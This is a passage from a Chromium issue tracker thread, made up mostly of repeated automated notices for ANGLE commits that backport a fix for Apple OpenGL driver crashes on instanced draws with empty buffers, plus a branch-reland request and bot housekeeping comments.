Change-Id: I66b7c7017843153db2df3bc50010cba765d03c5f
Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/4642048
Commit-Queue: Geoff Lang <geofflang@chromium.org>
Reviewed-by: Shahbaz Youssefi <syoussefi@chromium.org>
(cherry picked from commit 4e6124dae892690204f8e5996aeaad14f45e0a97)
Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/4727452

[modify] https://crrev.com/cafe56b591edb77f041be70b58cac3a61565644a/src/tests/gl_tests/WebGLCompatibilityTest.cpp
[modify] https://crrev.com/cafe56b591edb77f041be70b58cac3a61565644a/util/angle_features_autogen.cpp
[modify] https://crrev.com/cafe56b591edb77f041be70b58cac3a61565644a/src/libANGLE/renderer/gl/BufferGL.cpp
[modify] https://crrev.com/cafe56b591edb77f041be70b58cac3a61565644a/src/libANGLE/renderer/gl/VertexArrayGL.cpp
[modify] https://crrev.com/cafe56b591edb77f041be70b58cac3a61565644a/util/angle_features_autogen.h
[modify] https://crrev.com/cafe56b591edb77f041be70b58cac3a61565644a/src/libANGLE/renderer/gl/renderergl_utils.cpp
[modify] https://crrev.com/cafe56b591edb77f041be70b58cac3a61565644a/src/tests/angle_end2end_tests_expectations.txt
[modify] https://crrev.com/cafe56b591edb77f041be70b58cac3a61565644a/include/platform/FeaturesGL_autogen.h
[modify] https://crrev.com/cafe56b591edb77f041be70b58cac3a61565644a/src/libANGLE/renderer/gl/BufferGL.h
[modify] https://crrev.com/cafe56b591edb77f041be70b58cac3a61565644a/scripts/code_generation_hashes/ANGLE_features.json
[modify] https://crrev.com/cafe56b591edb77f041be70b58cac3a61565644a/include/platform/gl_features.json


### gi...@appspot.gserviceaccount.com (2023-07-28)

The following revision refers to this bug:
  https://chromium.googlesource.com/angle/angle/+/ce590bee825a18785f86d096f2c7be06428ccf88

commit ce590bee825a18785f86d096f2c7be06428ccf88
Author: Geoff Lang <geofflang@chromium.org>
Date: Fri Jun 23 18:46:28 2023

M114: GL: Ensure all instanced attributes have a buffer with data

Apple OpenGL drivers sometimes crash when given an instanced draw with
a buffer that has never been given data.

It's not efficient to check if the attribute is both zero-sized and
instanced so just ensure that every time a zero-sized buffer is bound
to an attribute, it gets initialized with some data.

Bug: chromium:1456243
Change-Id: I66b7c7017843153db2df3bc50010cba765d03c5f
Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/4642048
Commit-Queue: Geoff Lang <geofflang@chromium.org>
Reviewed-by: Shahbaz Youssefi <syoussefi@chromium.org>
(cherry picked from commit 4e6124dae892690204f8e5996aeaad14f45e0a97)
Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/4727454

[modify] https://crrev.com/ce590bee825a18785f86d096f2c7be06428ccf88/src/tests/gl_tests/WebGLCompatibilityTest.cpp
[modify] https://crrev.com/ce590bee825a18785f86d096f2c7be06428ccf88/util/angle_features_autogen.cpp
[modify] https://crrev.com/ce590bee825a18785f86d096f2c7be06428ccf88/src/libANGLE/renderer/gl/BufferGL.cpp
[modify] https://crrev.com/ce590bee825a18785f86d096f2c7be06428ccf88/src/libANGLE/renderer/gl/VertexArrayGL.cpp
[modify] https://crrev.com/ce590bee825a18785f86d096f2c7be06428ccf88/util/angle_features_autogen.h
[modify] https://crrev.com/ce590bee825a18785f86d096f2c7be06428ccf88/src/libANGLE/renderer/gl/renderergl_utils.cpp
[modify] https://crrev.com/ce590bee825a18785f86d096f2c7be06428ccf88/src/tests/angle_end2end_tests_expectations.txt
[modify] https://crrev.com/ce590bee825a18785f86d096f2c7be06428ccf88/include/platform/FeaturesGL_autogen.h
[modify] https://crrev.com/ce590bee825a18785f86d096f2c7be06428ccf88/src/libANGLE/renderer/gl/BufferGL.h
[modify] https://crrev.com/ce590bee825a18785f86d096f2c7be06428ccf88/scripts/code_generation_hashes/ANGLE_features.json
[modify] https://crrev.com/ce590bee825a18785f86d096f2c7be06428ccf88/include/platform/gl_features.json


### gi...@appspot.gserviceaccount.com (2023-07-28)

The following revision refers to this bug:
  https://chromium.googlesource.com/angle/angle/+/dfa3a3070f78ad59955768ab666de19b1d8c413c

commit dfa3a3070f78ad59955768ab666de19b1d8c413c
Author: Geoff Lang <geofflang@chromium.org>
Date: Fri Jun 23 18:46:28 2023

M115: GL: Ensure all instanced attributes have a buffer with data

Apple OpenGL drivers sometimes crash when given an instanced draw with
a buffer that has never been given data.

It's not efficient to check if the attribute is both zero-sized and
instanced so just ensure that every time a zero-sized buffer is bound
to an attribute, it gets initialized with some data.

Bug: chromium:1456243
Change-Id: I66b7c7017843153db2df3bc50010cba765d03c5f
Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/4642048
Commit-Queue: Geoff Lang <geofflang@chromium.org>
Reviewed-by: Shahbaz Youssefi <syoussefi@chromium.org>
(cherry picked from commit 4e6124dae892690204f8e5996aeaad14f45e0a97)
Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/4727453

[modify] https://crrev.com/dfa3a3070f78ad59955768ab666de19b1d8c413c/src/tests/gl_tests/WebGLCompatibilityTest.cpp
[modify] https://crrev.com/dfa3a3070f78ad59955768ab666de19b1d8c413c/src/libANGLE/renderer/gl/BufferGL.cpp
[modify] https://crrev.com/dfa3a3070f78ad59955768ab666de19b1d8c413c/util/angle_features_autogen.cpp
[modify] https://crrev.com/dfa3a3070f78ad59955768ab666de19b1d8c413c/src/libANGLE/renderer/gl/VertexArrayGL.cpp
[modify] https://crrev.com/dfa3a3070f78ad59955768ab666de19b1d8c413c/util/angle_features_autogen.h
[modify] https://crrev.com/dfa3a3070f78ad59955768ab666de19b1d8c413c/src/libANGLE/renderer/gl/renderergl_utils.cpp
[modify] https://crrev.com/dfa3a3070f78ad59955768ab666de19b1d8c413c/src/tests/angle_end2end_tests_expectations.txt
[modify] https://crrev.com/dfa3a3070f78ad59955768ab666de19b1d8c413c/include/platform/FeaturesGL_autogen.h
[modify] https://crrev.com/dfa3a3070f78ad59955768ab666de19b1d8c413c/src/libANGLE/renderer/gl/BufferGL.h
[modify] https://crrev.com/dfa3a3070f78ad59955768ab666de19b1d8c413c/scripts/code_generation_hashes/ANGLE_features.json
[modify] https://crrev.com/dfa3a3070f78ad59955768ab666de19b1d8c413c/include/platform/gl_features.json


### gi...@appspot.gserviceaccount.com (2023-07-28)

The following revision refers to this bug:
  https://chromium.googlesource.com/angle/angle/+/cafe56b591edb77f041be70b58cac3a61565644a

commit cafe56b591edb77f041be70b58cac3a61565644a
Author: Geoff Lang <geofflang@chromium.org>
Date: Fri Jun 23 18:46:28 2023

M116: GL: Ensure all instanced attributes have a buffer with data

Apple OpenGL drivers sometimes crash when given an instanced draw with
a buffer that has never been given data.

It's not efficient to check if the attribute is both zero-sized and
instanced so just ensure that every time a zero-sized buffer is bound
to an attribute, it gets initialized with some data.

Bug: chromium:1456243
Change-Id: I66b7c7017843153db2df3bc50010cba765d03c5f
Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/4642048
Commit-Queue: Geoff Lang <geofflang@chromium.org>
Reviewed-by: Shahbaz Youssefi <syoussefi@chromium.org>
(cherry picked from commit 4e6124dae892690204f8e5996aeaad14f45e0a97)
Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/4727452

[modify] https://crrev.com/cafe56b591edb77f041be70b58cac3a61565644a/src/tests/gl_tests/WebGLCompatibilityTest.cpp
[modify] https://crrev.com/cafe56b591edb77f041be70b58cac3a61565644a/src/libANGLE/renderer/gl/BufferGL.cpp
[modify] https://crrev.com/cafe56b591edb77f041be70b58cac3a61565644a/util/angle_features_autogen.cpp
[modify] https://crrev.com/cafe56b591edb77f041be70b58cac3a61565644a/src/libANGLE/renderer/gl/VertexArrayGL.cpp
[modify] https://crrev.com/cafe56b591edb77f041be70b58cac3a61565644a/util/angle_features_autogen.h
[modify] https://crrev.com/cafe56b591edb77f041be70b58cac3a61565644a/src/libANGLE/renderer/gl/renderergl_utils.cpp
[modify] https://crrev.com/cafe56b591edb77f041be70b58cac3a61565644a/src/tests/angle_end2end_tests_expectations.txt
[modify] https://crrev.com/cafe56b591edb77f041be70b58cac3a61565644a/include/platform/FeaturesGL_autogen.h
[modify] https://crrev.com/cafe56b591edb77f041be70b58cac3a61565644a/src/libANGLE/renderer/gl/BufferGL.h
[modify] https://crrev.com/cafe56b591edb77f041be70b58cac3a61565644a/scripts/code_generation_hashes/ANGLE_features.json
[modify] https://crrev.com/cafe56b591edb77f041be70b58cac3a61565644a/include/platform/gl_features.json


### gi...@appspot.gserviceaccount.com (2023-07-28)

The following revision refers to this bug:
  https://chromium.googlesource.com/angle/angle/+/ce590bee825a18785f86d096f2c7be06428ccf88

commit ce590bee825a18785f86d096f2c7be06428ccf88
Author: Geoff Lang <geofflang@chromium.org>
Date: Fri Jun 23 18:46:28 2023

M114: GL: Ensure all instanced attributes have a buffer with data

Apple OpenGL drivers sometimes crash when given an instanced draw with
a buffer that has never been given data.

It's not efficient to check if the attribute is both zero-sized and
instanced so just ensure that every time a zero-sized buffer is bound
to an attribute, it gets initialized with some data.

Bug: chromium:1456243
Change-Id: I66b7c7017843153db2df3bc50010cba765d03c5f
Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/4642048
Commit-Queue: Geoff Lang <geofflang@chromium.org>
Reviewed-by: Shahbaz Youssefi <syoussefi@chromium.org>
(cherry picked from commit 4e6124dae892690204f8e5996aeaad14f45e0a97)
Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/4727454

[modify] https://crrev.com/ce590bee825a18785f86d096f2c7be06428ccf88/src/tests/gl_tests/WebGLCompatibilityTest.cpp
[modify] https://crrev.com/ce590bee825a18785f86d096f2c7be06428ccf88/util/angle_features_autogen.cpp
[modify] https://crrev.com/ce590bee825a18785f86d096f2c7be06428ccf88/src/libANGLE/renderer/gl/BufferGL.cpp
[modify] https://crrev.com/ce590bee825a18785f86d096f2c7be06428ccf88/src/libANGLE/renderer/gl/VertexArrayGL.cpp
[modify] https://crrev.com/ce590bee825a18785f86d096f2c7be06428ccf88/util/angle_features_autogen.h
[modify] https://crrev.com/ce590bee825a18785f86d096f2c7be06428ccf88/src/libANGLE/renderer/gl/renderergl_utils.cpp
[modify] https://crrev.com/ce590bee825a18785f86d096f2c7be06428ccf88/src/tests/angle_end2end_tests_expectations.txt
[modify] https://crrev.com/ce590bee825a18785f86d096f2c7be06428ccf88/include/platform/FeaturesGL_autogen.h
[modify] https://crrev.com/ce590bee825a18785f86d096f2c7be06428ccf88/src/libANGLE/renderer/gl/BufferGL.h
[modify] https://crrev.com/ce590bee825a18785f86d096f2c7be06428ccf88/scripts/code_generation_hashes/ANGLE_features.json
[modify] https://crrev.com/ce590bee825a18785f86d096f2c7be06428ccf88/include/platform/gl_features.json


### gi...@appspot.gserviceaccount.com (2023-07-28)

The following revision refers to this bug:
  https://chromium.googlesource.com/angle/angle/+/cafe56b591edb77f041be70b58cac3a61565644a

commit cafe56b591edb77f041be70b58cac3a61565644a
Author: Geoff Lang <geofflang@chromium.org>
Date: Fri Jun 23 18:46:28 2023

M116: GL: Ensure all instanced attributes have a buffer with data

Apple OpenGL drivers sometimes crash when given an instanced draw with
a buffer that has never been given data.

It's not efficient to check if the attribute is both zero-sized and
instanced so just ensure that every time a zero-sized buffer is bound
to an attribute, it gets initialized with some data.

Bug: chromium:1456243
Change-Id: I66b7c7017843153db2df3bc50010cba765d03c5f
Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/4642048
Commit-Queue: Geoff Lang <geofflang@chromium.org>
Reviewed-by: Shahbaz Youssefi <syoussefi@chromium.org>
(cherry picked from commit 4e6124dae892690204f8e5996aeaad14f45e0a97)
Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/4727452

[modify] https://crrev.com/cafe56b591edb77f041be70b58cac3a61565644a/src/tests/gl_tests/WebGLCompatibilityTest.cpp
[modify] https://crrev.com/cafe56b591edb77f041be70b58cac3a61565644a/util/angle_features_autogen.cpp
[modify] https://crrev.com/cafe56b591edb77f041be70b58cac3a61565644a/src/libANGLE/renderer/gl/BufferGL.cpp
[modify] https://crrev.com/cafe56b591edb77f041be70b58cac3a61565644a/src/libANGLE/renderer/gl/VertexArrayGL.cpp
[modify] https://crrev.com/cafe56b591edb77f041be70b58cac3a61565644a/util/angle_features_autogen.h
[modify] https://crrev.com/cafe56b591edb77f041be70b58cac3a61565644a/src/libANGLE/renderer/gl/renderergl_utils.cpp
[modify] https://crrev.com/cafe56b591edb77f041be70b58cac3a61565644a/src/tests/angle_end2end_tests_expectations.txt
[modify] https://crrev.com/cafe56b591edb77f041be70b58cac3a61565644a/include/platform/FeaturesGL_autogen.h
[modify] https://crrev.com/cafe56b591edb77f041be70b58cac3a61565644a/src/libANGLE/renderer/gl/BufferGL.h
[modify] https://crrev.com/cafe56b591edb77f041be70b58cac3a61565644a/scripts/code_generation_hashes/ANGLE_features.json
[modify] https://crrev.com/cafe56b591edb77f041be70b58cac3a61565644a/include/platform/gl_features.json


### am...@google.com (2023-07-28)

[Empty comment from Monorail migration]

### am...@chromium.org (2023-08-01)

[Empty comment from Monorail migration]

### am...@google.com (2023-08-02)

[Empty comment from Monorail migration]

### pg...@google.com (2023-08-03)

[Empty comment from Monorail migration]

### da...@google.com (2023-08-08)

geofflang@chromium.org, https://crbug.com/chromium/1456243#c40 landed in the wrong branch for M116. It should be 5845, can you please reland to ensure the fix is included in M116 please?

### gi...@appspot.gserviceaccount.com (2023-08-09)

The following revision refers to this bug:
  https://chromium.googlesource.com/angle/angle/+/939f6880118192066597f8bdc433255341df56ae

commit 939f6880118192066597f8bdc433255341df56ae
Author: Geoff Lang <geofflang@chromium.org>
Date: Fri Jun 23 18:46:28 2023

GL: Ensure all instanced attributes have a buffer with data

Apple OpenGL drivers sometimes crash when given an instanced draw with
a buffer that has never been given data.

It's not efficient to check if the attribute is both zero-sized and
instanced so just ensure that every time a zero-sized buffer is bound
to an attribute, it gets initialized with some data.

Bug: chromium:1456243
Change-Id: I66b7c7017843153db2df3bc50010cba765d03c5f
Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/4642048
Commit-Queue: Geoff Lang <geofflang@chromium.org>
Reviewed-by: Shahbaz Youssefi <syoussefi@chromium.org>
(cherry picked from commit 4e6124dae892690204f8e5996aeaad14f45e0a97)
Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/4765137
Auto-Submit: Daniel Yip <danielyip@google.com>
Commit-Queue: Daniel Yip <danielyip@google.com>

[modify] https://crrev.com/939f6880118192066597f8bdc433255341df56ae/src/tests/gl_tests/WebGLCompatibilityTest.cpp
[modify] https://crrev.com/939f6880118192066597f8bdc433255341df56ae/src/libANGLE/renderer/gl/BufferGL.cpp
[modify] https://crrev.com/939f6880118192066597f8bdc433255341df56ae/src/libANGLE/renderer/gl/VertexArrayGL.cpp
[modify] https://crrev.com/939f6880118192066597f8bdc433255341df56ae/util/autogen/angle_features_autogen.h
[modify] https://crrev.com/939f6880118192066597f8bdc433255341df56ae/src/libANGLE/renderer/gl/renderergl_utils.cpp
[modify] https://crrev.com/939f6880118192066597f8bdc433255341df56ae/include/platform/autogen/FeaturesGL_autogen.h
[modify] https://crrev.com/939f6880118192066597f8bdc433255341df56ae/util/autogen/angle_features_autogen.cpp
[modify] https://crrev.com/939f6880118192066597f8bdc433255341df56ae/src/tests/angle_end2end_tests_expectations.txt
[modify] https://crrev.com/939f6880118192066597f8bdc433255341df56ae/src/libANGLE/renderer/gl/BufferGL.h
[modify] https://crrev.com/939f6880118192066597f8bdc433255341df56ae/include/platform/gl_features.json


### kb...@chromium.org (2023-08-28)

[Empty comment from Monorail migration]

### [Deleted User] (2023-10-25)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1456243?no_tracker_redirect=1

[Multiple monorail components: Blink>WebGL, Internals>GPU>ANGLE]
[Monorail blocking: crbug.com/angleproject/8264, crbug.com/angleproject/8324]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40066076)*
